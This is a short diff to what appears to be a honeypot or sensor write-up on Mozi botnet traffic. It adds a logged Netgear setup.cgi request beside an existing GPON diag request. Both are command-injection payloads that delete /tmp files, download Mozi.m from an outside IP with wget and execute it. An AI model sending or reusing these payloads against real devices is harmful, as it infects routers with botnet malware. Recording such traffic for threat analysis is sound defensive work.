@@ -32,3 +32,8 @@ Mozi's malicious packets found on the sensor. Some are different as the adversar
   Content-Length: 118
 
   XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://61.53.61.122:48846/Mozi.m+-O+->/tmp/gpon80;s
+  
+  
+  2021-10-23 01:54:09 from 125.105.70.109
+  GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.105.70.109:44703/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
+
